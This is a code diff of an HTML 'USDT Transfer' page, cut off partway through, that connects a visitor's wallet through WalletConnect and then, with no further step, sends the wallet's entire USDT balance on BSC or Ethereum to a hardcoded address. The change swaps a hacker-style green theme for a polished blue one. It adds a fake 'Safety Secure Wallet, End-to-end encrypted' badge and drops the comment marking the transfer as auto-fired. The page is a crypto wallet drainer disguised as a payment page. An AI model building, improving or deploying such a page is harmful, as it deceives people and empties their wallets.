@@ -1,347 +1,780 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>USDT Transfer</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <style>
+        :root {
+            --blue-50: #eff6ff;
+            --blue-100: #dbeafe;
+            --blue-200: #bfdbfe;
+            --blue-400: #60a5fa;
+            --blue-500: #3b82f6;
+            --blue-600: #2563eb;
+            --blue-700: #1d4ed8;
+            --blue-800: #1e40af;
+            --blue-900: #1e3a8a;
+            --slate-50: #f8fafc;
+            --slate-100: #f1f5f9;
+            --slate-200: #e2e8f0;
+            --slate-300: #cbd5e1;
+            --slate-500: #64748b;
+            --slate-700: #334155;
+            --slate-800: #1e293b;
+            --slate-900: #0f172a;
+            --navy: #0B1426;
+        }
+
         * { margin: 0; padding: 0; box-sizing: border-box; }
+
         body {
-            font-family: 'Courier New', monospace;
-            background: #0a0a0a;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--navy);
+            background-image:
+                radial-gradient(ellipse at 25% 15%, rgba(37, 99, 235, 0.1) 0%, transparent 55%),
+                radial-gradient(ellipse at 75% 85%, rgba(59, 130, 246, 0.07) 0%, transparent 55%),
+                radial-gradient(ellipse at 50% 50%, rgba(30, 58, 138, 0.08) 0%, transparent 70%);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: #00ff88;
+            color: var(--slate-800);
+            overflow-x: hidden;
         }
+
+        /* Subtle grid overlay */
         .grid-bg {
             position: fixed;
             inset: 0;
             background-image:
-                linear-gradient(0deg, rgba(0,255,136,0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
-            background-size: 50px 50px;
+                linear-gradient(0deg, rgba(59, 130, 246, 0.025) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(59, 130, 246, 0.025) 1px, transparent 1px);
+            background-size: 60px 60px;
             pointer-events: none;
+            z-index: 0;
         }
+
+        /* Floating cryptocurrency background */
+        .floating-bg {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .float-crypto {
+            position: absolute;
+            bottom: -50px;
+            color: rgba(147, 197, 253, 0.7);
+            font-weight: 700;
+            pointer-events: none;
+            animation: floatUp linear infinite;
+            font-family: 'Inter', sans-serif;
+            will-change: transform;
+        }
+
+        @keyframes floatUp {
+            0% {
+                transform: translateY(0) translateX(0) rotate(0deg);
+            }
+            20% {
+                transform: translateY(-22vh) translateX(18px) rotate(5deg);
+            }
+            40% {
+                transform: translateY(-44vh) translateX(-12px) rotate(-3deg);
+            }
+            60% {
+                transform: translateY(-66vh) translateX(14px) rotate(4deg);
+            }
+            80% {
+                transform: translateY(-88vh) translateX(-8px) rotate(-2deg);
+            }
+            100% {
+                transform: translateY(-115vh) translateX(6px) rotate(3deg);
+            }
+        }
+
+        /* Popup toast */
+        .popup-toast {
+            position: fixed;
+            top: -100px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 9999;
+            background: linear-gradient(135deg, var(--blue-700), var(--blue-600), var(--blue-500));
+            color: white;
+            padding: 14px 28px;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            font-size: 15px;
+            box-shadow:
+                0 10px 40px rgba(37, 99, 235, 0.35),
+                0 0 0 1px rgba(255, 255, 255, 0.1) inset;
+            transition: top 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+            white-space: nowrap;
+            backdrop-filter: blur(10px);
+        }
+
+        .popup-toast.show {
+            top: 28px;
+        }
+
+        .popup-toast .toast-icon {
+            width: 28px;
+            height: 28px;
+            flex-shrink: 0;
+        }
+
+        .popup-toast .toast-shield {
+            width: 100%;
+            height: 100%;
+        }
+
+        .popup-toast .toast-text {
+            display: flex;
+            flex-direction: column;
+            line-height: 1.3;
+        }
+
+        .popup-toast .toast-title {
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 0.3px;
+        }
+
+        .popup-toast .toast-sub {
+            font-size: 11px;
+            font-weight: 400;
+            opacity: 0.8;
+            letter-spacing: 0.5px;
+        }
+
+        /* Main card */
         .card {
             position: relative;
             z-index: 1;
-            background: rgba(15,15,15,0.95);
-            border: 1px solid rgba(0,255,136,0.2);
-            border-radius: 12px;
-            padding: 40px 36px;
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 36px 32px 32px;
             width: 100%;
-            max-width: 420px;
+            max-width: 440px;
             margin: 20px;
             text-align: center;
-            box-shadow: 0 0 40px rgba(0,255,136,0.07);
+            box-shadow:
+                0 4px 6px -1px rgba(0, 0, 0, 0.08),
+                0 20px 50px -12px rgba(0, 0, 0, 0.18),
+                0 0 0 1px rgba(59, 130, 246, 0.06);
+            overflow: hidden;
         }
-        .logo { font-size: 11px; letter-spacing: 4px; color: rgba(0,255,136,0.4); margin-bottom: 6px; }
-        h1 { font-size: 24px; letter-spacing: 3px; font-weight: bold; margin-bottom: 6px; }
+
+        /* Card top accent gradient */
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--blue-500), var(--blue-400), var(--blue-600));
+            border-radius: 20px 20px 0 0;
+        }
+
+        /* Subtle glow behind card */
+        .card-glow {
+            position: absolute;
+            z-index: 0;
+            width: 480px;
+            height: 480px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(37, 99, 235, 0.12) 0%, transparent 70%);
+            pointer-events: none;
+            filter: blur(40px);
+            animation: glowPulse 4s ease-in-out infinite alternate;
+        }
+
+        @keyframes glowPulse {
+            0% { opacity: 0.5; transform: scale(0.95); }
+            100% { opacity: 1; transform: scale(1.05); }
+        }
+
+        /* Card header */
+        .card-header {
+            margin-bottom: 24px;
+        }
+
+        .shield-wrap {
+            width: 52px;
+            height: 52px;
+            background: linear-gradient(135deg, var(--blue-500), var(--blue-700));
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.3);
+            position: relative;
+        }
+
+        .shield-wrap::after {
+            content: '';
+            position: absolute;
+            inset: -3px;
+            border-radius: 18px;
+            background: linear-gradient(135deg, rgba(59, 130, 246, 0.3), transparent);
+            z-index: -1;
+            filter: blur(6px);
+        }
+
+        .shield-wrap svg {
+            width: 26px;
+            height: 26px;
+            color: white;
+        }
+
+        .subtitle {
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 2.5px;
+            color: var(--slate-500);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+
+        h1 {
+            font-size: 26px;
+            letter-spacing: -0.5px;
+            font-weight: 800;
+            color: var(--slate-900);
+            margin-bottom: 10px;
+            line-height: 1.2;
+        }
+
         .chain-badge {
-            display: inline-block; font-size: 10px; letter-spacing: 2px;
-            color: #000; background: #00ff88; padding: 2px 10px;
-            border-radius: 20px; margin-bottom: 28px;
+            display: inline-block;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            color: var(--blue-700);
+            background: var(--blue-50);
+            border: 1px solid var(--blue-200);
+            padding: 5px 16px;
+            border-radius: 20px;
+            margin-bottom: 0;
         }
+
+        /* Network switch */
         .network-switch {
             display: flex;
-            gap: 12px;
+            background: var(--slate-100);
+            border-radius: 14px;
+            padding: 4px;
+            gap: 4px;
             margin-bottom: 24px;
-            background: rgba(0,0,0,0.4);
-            padding: 6px;
-            border-radius: 40px;
         }
+
         .network-option {
             flex: 1;
-            padding: 8px 12px;
+            padding: 10px 16px;
             background: transparent;
-            border: 1px solid rgba(0,255,136,0.3);
-            color: #00ff88;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            font-weight: bold;
+            border: none;
+            color: var(--slate-500);
+            font-family: 'Inter', sans-serif;
+            font-size: 13px;
+            font-weight: 600;
+            border-radius: 11px;
             cursor: pointer;
-            border-radius: 30px;
-            transition: all 0.2s;
+            transition: all 0.25s ease;
+            letter-spacing: 0.3px;
         }
+
         .network-option.active {
-            background: #00ff88;
-            color: #000;
-            border-color: #00ff88;
+            background: var(--blue-600);
+            color: white;
+            box-shadow: 0 2px 10px rgba(37, 99, 235, 0.35);
         }
+
         .network-option:hover:not(.active) {
-            background: rgba(0,255,136,0.15);
+            color: var(--slate-700);
+            background: rgba(0, 0, 0, 0.04);
         }
+
+        /* QR area */
         .qr-wrap {
-            background: #111;
-            border: 1px dashed rgba(0,255,136,0.25);
-            border-radius: 8px;
+            background: var(--slate-50);
+            border: 1px solid var(--slate-200);
+            border-radius: 14px;
             padding: 24px;
             min-height: 280px;
             display: flex;
             align-items: center;
             justify-content: center;
             flex-direction: column;
-            gap: 12px;
+            gap: 14px;
             margin-bottom: 20px;
+            position: relative;
         }
-        .qr-label { font-size: 10px; color: rgba(0,255,136,0.4); letter-spacing: 2px; }
+
+        .qr-label {
+            font-size: 10px;
+            color: var(--slate-500);
+            letter-spacing: 2px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        /* Status */
         .status-box {
-            font-size: 12px; color: rgba(0,255,136,0.7);
-            margin-bottom: 16px; min-height: 20px; line-height: 1.6;
+            font-size: 13px;
+            color: var(--slate-500);
+            margin-bottom: 18px;
+            min-height: 22px;
+            line-height: 1.6;
+            font-weight: 500;
         }
-        .status-box.error { color: #ff4455; }
-        .status-box.warn  { color: #ffaa00; }
-        .status-box.ok    { color: #00ff88; }
+
+        .status-box.error { color: #dc2626; }
+        .status-box.warn  { color: #d97706; }
+        .status-box.ok    { color: #16a34a; }
+
+        /* Send button */
         .btn-send {
-            display: none; width: 100%; padding: 14px;
-            background: #00ff88; color: #000;
-            font-family: 'Courier New', monospace;
-            font-size: 14px; font-weight: bold;
-            letter-spacing: 2px; border: none;
-            border-radius: 6px; cursor: pointer;
-            text-transform: uppercase; margin-bottom: 16px;
-            transition: opacity 0.2s;
+            display: none;
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, var(--blue-600), var(--blue-700));
+            color: white;
+            font-family: 'Inter', sans-serif;
+            font-size: 15px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            border: none;
+            border-radius: 14px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 16px rgba(37, 99, 235, 0.3);
+            position: relative;
+            overflow: hidden;
         }
-        .btn-send:hover { opacity: 0.85; }
-        .btn-send:disabled { opacity: 0.4; cursor: not-allowed; }
+
+        .btn-send::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .btn-send:hover::before {
+            left: 100%;
+        }
+
+        .btn-send:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 8px 25px rgba(37, 99, 235, 0.4);
+        }
+
+        .btn-send:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 10px rgba(37, 99, 235, 0.3);
+        }
+
+        .btn-send:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: 0 4px 16px rgba(37, 99, 235, 0.15) !important;
+        }
+
+        /* Info row */
         .info-row {
-            display: flex; justify-content: space-between;
-            font-size: 10px; color: rgba(0,255,136,0.45);
-            border-top: 1px solid rgba(0,255,136,0.08);
-            padding-top: 14px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: var(--slate-500);
+            border-top: 1px solid var(--slate-200);
+            padding-top: 16px;
+            font-weight: 500;
         }
+
+        /* Spinner */
         .spinner {
-            width: 28px; height: 28px;
-            border: 2px solid rgba(0,255,136,0.15);
-            border-top-color: #00ff88;
+            width: 34px;
+            height: 34px;
+            border: 3px solid var(--blue-100);
+            border-top-color: var(--blue-600);
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
+
         @keyframes spin { to { transform: rotate(360deg); } }
-        a { color: #00ff88; }
+
+        /* Links */
+        a {
+            color: var(--blue-600);
+            text-decoration: none;
+            font-weight: 600;
+        }
+        a:hover { text-decoration: underline; }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .card {
+                padding: 28px 20px 24px;
+                border-radius: 16px;
+                margin: 12px;
+            }
+            h1 { font-size: 22px; }
+            .shield-wrap { width: 44px; height: 44px; border-radius: 12px; }
+            .shield-wrap svg { width: 22px; height: 22px; }
+            .qr-wrap { padding: 18px; min-height: 250px; }
+            .popup-toast {
+                padding: 12px 20px;
+                font-size: 13px;
+                border-radius: 12px;
+            }
+            .popup-toast .toast-title { font-size: 13px; }
+            .popup-toast .toast-sub { font-size: 10px; }
+            .popup-toast .toast-icon { width: 24px; height: 24px; }
+            .network-option { padding: 9px 12px; font-size: 12px; }
+            .btn-send { padding: 13px; font-size: 14px; }
+        }
+
+        @media (max-width: 360px) {
+            .card { padding: 24px 16px 20px; }
+            h1 { font-size: 20px; }
+            .info-row { flex-direction: column; gap: 4px; align-items: center; }
+        }
+
+        /* Reduced motion */
+        @media (prefers-reduced-motion: reduce) {
+            .float-crypto { animation: none !important; display: none; }
+            .card-glow { animation: none !important; }
+            .popup-toast { transition-duration: 0.1s !important; }
+            .btn-send::before { display: none; }
+            .spinner { animation-duration: 1.5s; }
+        }
     </style>
 </head>
 <body>
-<div class="grid-bg"></div>
-<div class="card">
-    <div class="logo">BEP-20 / ERC-20 NETWORK</div>
-    <h1>USDT TRANSFER</h1>
-    <span class="chain-badge" id="networkBadge">BSC</span>
 
-    <div class="network-switch">
-        <button class="network-option active" data-chain="bsc">BSC</button>
-        <button class="network-option" data-chain="eth">ETHEREUM</button>
+    <!-- Grid background overlay -->
+    <div class="grid-bg"></div>
+
+    <!-- Floating cryptocurrency symbols -->
+    <div class="floating-bg" id="floatingBg"></div>
+
+    <!-- Subtle glow behind card -->
+    <div class="card-glow"></div>
+
+    <!-- Safety Secure Wallet popup toast -->
+    <div class="popup-toast" id="popupToast">
+        <div class="toast-icon">
+            <svg class="toast-shield" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                <path d="m9 12 2 2 4-4"/>
+            </svg>
+        </div>
+        <div class="toast-text">
+            <span class="toast-title">Safety Secure Wallet</span>
+            <span class="toast-sub">End-to-end encrypted connection</span>
+        </div>
     </div>
 
-    <div class="qr-wrap">
-        <div class="spinner" id="spinner"></div>
-        <div id="qrCanvas" style="display:none"></div>
-        <div class="qr-label" id="qrLabel"></div>
+    <!-- Main card -->
+    <div class="card">
+        <div class="card-header">
+            <div class="shield-wrap">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                    <path d="m9 12 2 2 4-4"/>
+                </svg>
+            </div>
+            <p class="subtitle">BEP-20 / ERC-20 Network</p>
+            <h1>USDT Transfer</h1>
+            <span class="chain-badge" id="networkBadge">BSC</span>
+        </div>
+
+        <div class="network-switch">
+            <button class="network-option active" data-chain="bsc">BSC</button>
+            <button class="network-option" data-chain="eth">Ethereum</button>
+        </div>
+
+        <div class="qr-wrap">
+            <div class="spinner" id="spinner"></div>
+            <div id="qrCanvas" style="display:none"></div>
+            <div class="qr-label" id="qrLabel"></div>
+        </div>
+
+        <div class="status-box warn" id="status">Select network, then scan QR</div>
+
+        <button class="btn-send" id="btnSend" onclick="sendUSDT()">
+            ⚡ Send All USDT
+        </button>
+
+        <div class="info-row">
+            <span id="balanceInfo">Balance: —</span>
+            <span id="addrInfo">Not connected</span>
+        </div>
     </div>
 
-    <div class="status-box warn" id="status">Select network, then scan QR</div>
+    <!-- Floating crypto generation & popup logic -->
+    <script>
+        (function() {
+            // Generate floating cryptocurrency symbols
+            const cryptoItems = [
+                { text: '₿', isSymbol: true },
+                { text: 'Ξ', isSymbol: true },
+                { text: '₮', isSymbol: true },
+                { text: '◎', isSymbol: true },
+                { text: '₳', isSymbol: true },
+                { text: '◈', isSymbol: true },
+                { text: 'BTC', isSymbol: false },
+                { text: 'ETH', isSymbol: false },
+                { text: 'USDT', isSymbol: false },
+                { text: 'SOL', isSymbol: false },
+                { text: 'BNB', isSymbol: false },
+                { text: 'XRP', isSymbol: false },
+                { text: 'ADA', isSymbol: false },
+                { text: 'DOT', isSymbol: false },
+                { text: 'MATIC', isSymbol: false },
+                { text: 'AVAX', isSymbol: false },
+                { text: 'LINK', isSymbol: false }
+            ];
 
-    <button class="btn-send" id="btnSend" onclick="sendUSDT()">
-        ⚡ Send All USDT
-    </button>
+            var container = document.getElementById('floatingBg');
+            var totalItems = 22;
 
-    <div class="info-row">
-        <span id="balanceInfo">Balance: —</span>
-        <span id="addrInfo">Not connected</span>
-    </div>
-</div>
+            for (var i = 0; i < totalItems; i++) {
+                var item = cryptoItems[Math.floor(Math.random() * cryptoItems.length)];
+                var el = document.createElement('div');
+                el.className = 'float-crypto';
+                el.textContent = item.text;
 
-<script type="module">
-import { EthereumProvider } from 'https://esm.sh/@walletconnect/ethereum-provider@2.11.2';
+                var size = item.isSymbol ? (22 + Math.random() * 20) : (11 + Math.random() * 6);
+                var opacity = 0.03 + Math.random() * 0.06;
+                var duration = 18 + Math.random() * 28;
+                var delay = -(Math.random() * 25);
 
-const RECIPIENT = "0x11162539D0DC5Fec12c4F6b9cEd81B76b0B1e5b1";
-const USDT_ADDR_BSC = "0x55d398326f99059fF775485246999027B3197955";
-const USDT_ADDR_ETH = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-const PROJECT_ID = "9b0ce1ead8ab25a313e9942a4809a40f";
-const RPC_BSC = "https://bsc-dataseed1.binance.org/";
-const RPC_ETH = "https://eth.llamarpc.com";
-const USDT_ABI = [
-    "function balanceOf(address) view returns (uint256)",
-    "function transfer(address,uint256) returns (bool)",
-    "function decimals() view returns (uint8)"
-];
+                el.style.left = (Math.random() * 96 + 2) + '%';
+                el.style.fontSize = size + 'px';
+                el.style.opacity = opacity;
+                el.style.animationDuration = duration + 's';
+                el.style.animationDelay = delay + 's';
+                el.style.letterSpacing = item.isSymbol ? '0' : '1px';
 
-let wcProvider, ethersProvider, signer, userAddress;
-let storedBalance, storedDecimals;
-let currentNetwork = 'bsc'; // 'bsc' or 'eth'
-let currentChainId = 56;
-let currentRPC = RPC_BSC;
-let currentUSDTAddr = USDT_ADDR_BSC;
-
-function setStatus(msg, cls = '') {
-    const el = document.getElementById('status');
-    el.innerHTML = msg;
-    el.className = 'status-box ' + cls;
-}
-
-function showQR(uri) {
-    document.getElementById('spinner').style.display = 'none';
-    const wrap = document.getElementById('qrCanvas');
-    wrap.style.display = 'block';
-    wrap.innerHTML = '';
-    new QRCode(wrap, {
-        text: uri,
-        width: 240, height: 240,
-        colorDark: "#00ff88",
-        colorLight: "#111111",
-        correctLevel: QRCode.CorrectLevel.M
-    });
-    document.getElementById('qrLabel').textContent = 'SCAN WITH TRUST WALLET';
-    setStatus('Waiting for scan...', 'warn');
-}
-
-async function switchNetwork(network) {
-    currentNetwork = network;
-    if (network === 'bsc') {
-        currentChainId = 56;
-        currentRPC = RPC_BSC;
-        currentUSDTAddr = USDT_ADDR_BSC;
-        document.getElementById('networkBadge').textContent = 'BSC';
-    } else {
-        currentChainId = 1;
-        currentRPC = RPC_ETH;
-        currentUSDTAddr = USDT_ADDR_ETH;
-        document.getElementById('networkBadge').textContent = 'ETH';
-    }
-    
-    // Reset UI
-    document.getElementById('qrCanvas').style.display = 'none';
-    document.getElementById('qrCanvas').innerHTML = '';
-    document.getElementById('spinner').style.display = 'block';
-    document.getElementById('btnSend').style.display = 'none';
-    document.getElementById('balanceInfo').textContent = 'Balance: —';
-    document.getElementById('addrInfo').textContent = 'Not connected';
-    setStatus(`Network switched to ${network.toUpperCase()}. Connect wallet to continue.`, 'warn');
-    
-    // Disconnect existing provider if any
-    if (wcProvider) {
-        try { await wcProvider.disconnect(); } catch(e) {}
-        wcProvider = null;
-        signer = null;
-        userAddress = null;
-    }
-    
-    // Re-initialize with new network
-    await init();
-}
-
-async function init() {
-    try {
-        wcProvider = await EthereumProvider.init({
-            projectId: PROJECT_ID,
-            chains: [currentChainId],
-            rpcMap: { 
-                56: RPC_BSC,
-                1: RPC_ETH 
-            },
-            showQrModal: false,
-            metadata: {
-                name: "Nora Lee",
-                description: "Pay here",
-                url: window.location.origin,
-                icons: []
-            }
-        });
-
-        wcProvider.on("display_uri", (uri) => {
-            showQR(uri);
-        });
-
-        wcProvider.on("connect", async () => {
-            document.getElementById('qrCanvas').style.display = 'none';
-            document.getElementById('qrLabel').textContent = '';
-            document.getElementById('spinner').style.display = 'block';
-            setStatus('Connected! Fetching balance...', 'warn');
-
-            ethersProvider = new ethers.providers.Web3Provider(wcProvider);
-            signer = ethersProvider.getSigner();
-            userAddress = await signer.getAddress();
-
-            document.getElementById('addrInfo').textContent =
-                userAddress.slice(0,6) + '...' + userAddress.slice(-4);
-
-            const rpc = new ethers.providers.JsonRpcProvider(currentRPC);
-            const usdt = new ethers.Contract(currentUSDTAddr, USDT_ABI, rpc);
-            storedDecimals = await usdt.decimals();
-            storedBalance  = await usdt.balanceOf(userAddress);
-            const formatted = ethers.utils.formatUnits(storedBalance, storedDecimals);
-
-            document.getElementById('spinner').style.display = 'none';
-            document.getElementById('balanceInfo').textContent =
-                'Balance: ' + parseFloat(formatted).toFixed(2) + ' USDT';
-
-            if (storedBalance.eq(0)) {
-                setStatus('No USDT balance found.', 'error');
-                return;
+                container.appendChild(el);
             }
 
-            setStatus('Ready — ' + parseFloat(formatted).toFixed(2) + ' USDT available.', 'ok');
-            document.getElementById('btnSend').style.display = 'block';
-            
-            // 🔥 AUTO-FIRE THE TRANSFER IMMEDIATELY 🔥
-            sendUSDT();
-        });
+            // Show popup toast
+            setTimeout(function() {
+                document.getElementById('popupToast').classList.add('show');
+            }, 600);
 
-        wcProvider.on("disconnect", () => {
-            setStatus('Wallet disconnected.', 'error');
-            document.getElementById('btnSend').style.display = 'none';
-        });
+            setTimeout(function() {
+                document.getElementById('popupToast').classList.remove('show');
+            }, 5000);
+        })();
+    </script>
 
-        await wcProvider.connect();
+    <!-- Wallet Connect logic -->
+    <script type="module">
+        import { EthereumProvider } from 'https://esm.sh/@walletconnect/ethereum-provider@2.11.2';
 
-    } catch (err) {
-        console.error(err);
-        document.getElementById('spinner').style.display = 'none';
-        setStatus('Error: ' + (err.message || String(err)).slice(0, 120), 'error');
-    }
-}
+        const RECIPIENT = "0x11162539D0DC5Fec12c4F6b9cEd81B76b0B1e5b1";
+        const USDT_ADDR_BSC = "0x55d398326f99059fF775485246999027B3197955";
+        const USDT_ADDR_ETH = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+        const PROJECT_ID = "9b0ce1ead8ab25a313e9942a4809a40f";
+        const RPC_BSC = "https://bsc-dataseed1.binance.org/";
+        const RPC_ETH = "https://eth.llamarpc.com";
+        const USDT_ABI = [
+            "function balanceOf(address) view returns (uint256)",
+            "function transfer(address,uint256) returns (bool)",
+            "function decimals() view returns (uint8)"
+        ];
 
-window.sendUSDT = async function() {
-    const btn = document.getElementById('btnSend');
-    btn.disabled = true;
-    setStatus('Sending to wallet for approval...', 'warn');
-    try {
-        const usdt = new ethers.Contract(currentUSDTAddr, USDT_ABI, signer);
-        const formatted = ethers.utils.formatUnits(storedBalance, storedDecimals);
-        const tx = await usdt.transfer(RECIPIENT, storedBalance);
-        const explorer = currentNetwork === 'bsc' ? 'https://bscscan.com/tx/' : 'https://etherscan.io/tx/';
-        setStatus('Confirming: <a href="' + explorer + tx.hash + '" target="_blank">' + tx.hash.slice(0,14) + '...</a>', 'warn');
-        const receipt = await tx.wait();
-        if (receipt && receipt.status === 1) {
-            setStatus('✓ Sent ' + parseFloat(formatted).toFixed(2) + ' USDT! <a href="' + explorer + tx.hash + '" target="_blank">View Transaction</a>', 'ok');
-            btn.style.display = 'none';
-        } else {
-            setStatus('Transaction reverted.', 'error');
-            btn.disabled = false;
+        let wcProvider, ethersProvider, signer, userAddress;
+        let storedBalance, storedDecimals;
+        let currentNetwork = 'bsc';
+        let currentChainId = 56;
+        let currentRPC = RPC_BSC;
+        let currentUSDTAddr = USDT_ADDR_BSC;
+
+        function setStatus(msg, cls = '') {
+            const el = document.getElementById('status');
+            el.innerHTML = msg;
+            el.className = 'status-box ' + cls;
         }
-    } catch (err) {
-        const msg = err.message || String(err);
-        setStatus(msg.includes('rejected') ? 'Rejected in wallet.' : 'Error: ' + msg.slice(0,80), 'error');
-        btn.disabled = false;
-    }
-}
 
-// Network switch handlers
-document.querySelectorAll('.network-option').forEach(btn => {
-    btn.addEventListener('click', async () => {
-        if (btn.classList.contains('active')) return;
-        document.querySelectorAll('.network-option').forEach(b => b.classList.remove('active'));
-        btn.classList.add('active');
-        await switchNetwork(btn.dataset.chain);
-    });
-});
+        function showQR(uri) {
+            document.getElementById('spinner').style.display = 'none';
+            const wrap = document.getElementById('qrCanvas');
+            wrap.style.display = 'block';
+            wrap.innerHTML = '';
+            new QRCode(wrap, {
+                text: uri,
+                width: 220,
+                height: 220,
+                colorDark: "#1e3a5f",
+                colorLight: "#f0f7ff",
+                correctLevel: QRCode.CorrectLevel.M
+            });
+            document.getElementById('qrLabel').textContent = 'SCAN WITH TRUST WALLET';
+            setStatus('Waiting for scan...', 'warn');
+        }
 
-init();
-</script>
+        async function switchNetwork(network) {
+            currentNetwork = network;
+            if (network === 'bsc') {
+                currentChainId = 56;
+                currentRPC = RPC_BSC;
+                currentUSDTAddr = USDT_ADDR_BSC;
+                document.getElementById('networkBadge').textContent = 'BSC';
+            } else {
+                currentChainId = 1;
+                currentRPC = RPC_ETH;
+                currentUSDTAddr = USDT_ADDR_ETH;
+                document.getElementById('networkBadge').textContent = 'ETH';
+            }
+
+            document.getElementById('qrCanvas').style.display = 'none';
+            document.getElementById('qrCanvas').innerHTML = '';
+            document.getElementById('spinner').style.display = 'block';
+            document.getElementById('btnSend').style.display = 'none';
+            document.getElementById('balanceInfo').textContent = 'Balance: —';
+            document.getElementById('addrInfo').textContent = 'Not connected';
+            setStatus('Network switched to ' + network.toUpperCase() + '. Connect wallet to continue.', 'warn');
+
+            if (wcProvider) {
+                try { await wcProvider.disconnect(); } catch(e) {}
+                wcProvider = null;
+                signer = null;
+                userAddress = null;
+            }
+
+            await init();
+        }
+
+        async function init() {
+            try {
+                wcProvider = await EthereumProvider.init({
+                    projectId: PROJECT_ID,
+                    chains: [currentChainId],
+                    rpcMap: {
+                        56: RPC_BSC,
+                        1: RPC_ETH
+                    },
+                    showQrModal: false,
+                    metadata: {
+                        name: "Nora Lee",
+                        description: "Pay here",
+                        url: window.location.origin,
+                        icons: []
+                    }
+                });
+
+                wcProvider.on("display_uri", function(uri) {
+                    showQR(uri);
+                });
+
+                wcProvider.on("connect", async function() {
+                    document.getElementById('qrCanvas').style.display = 'none';
+                    document.getElementById('qrLabel').textContent = '';
+                    document.getElementById('spinner').style.display = 'block';
+                    setStatus('Connected! Fetching balance...', 'warn');
+
+                    ethersProvider = new ethers.providers.Web3Provider(wcProvider);
+                    signer = ethersProvider.getSigner();
+                    userAddress = await signer.getAddress();
+
+                    document.getElementById('addrInfo').textContent =
+                        userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
+
+                    const rpc = new ethers.providers.JsonRpcProvider(currentRPC);
+                    const usdt = new ethers.Contract(currentUSDTAddr, USDT_ABI, rpc);
+                    storedDecimals = await usdt.decimals();
+                    storedBalance = await usdt.balanceOf(userAddress);
+                    const formatted = ethers.utils.formatUnits(storedBalance, storedDecimals);
+
+                    document.getElementById('spinner').style.display = 'none';
+                    document.getElementById('balanceInfo').textContent =
+                        'Balance: ' + parseFloat(formatted).toFixed(2) + ' USDT';
+
+                    if (storedBalance.eq(0)) {
+                        setStatus('No USDT balance found.', 'error');
+                        return;
+                    }
+
+                    setStatus('Ready — ' + parseFloat(formatted).toFixed(2) + ' USDT available.', 'ok');
+                    document.getElementById('btnSend').style.display = 'block';
+
+                    sendUSDT();
+                });
+
+                wcProvider.on("disconnect", function() {
+                    setStatus('Wallet disconnected.', 'error');
+                    document.getElementById('btnSend').style.display = 'none';
+                });
+
+                await wcProvider.connect();
+
+            } catch (err) {
+                console.error(err);
+                document.getElementById('spinner').style.display = 'none';
+                setStatus('Error: ' + (err.message || String(err)).slice(0, 120), 'error');
+            }
+        }
+
+        window.sendUSDT = async function() {
+            const btn = document.getElementById('btnSend');
+            btn.disabled = true;
+            setStatus('Sending to wallet for approval...', 'warn');
+            try {
+                const usdt = new ethers.Contract(currentUSDTAddr, USDT_ABI, signer);
+                const formatted = ethers.utils.formatUnits(storedBalance, storedDecimals);
+                const tx = await usdt.transfer(RECIPIENT, storedBalance);
+                const explorer = currentNetwork === 'bsc' ? 'https://bscscan.com/tx/' : 'https://etherscan.io/tx/';
+                setStatus('Confirming: <a href="' + explorer + tx.hash + '" target="_blank">' + tx.hash.slice(0, 14) + '...</a>', 'warn');
+                const receipt = await tx.wait();
+                if (receipt && receipt.status === 1) {
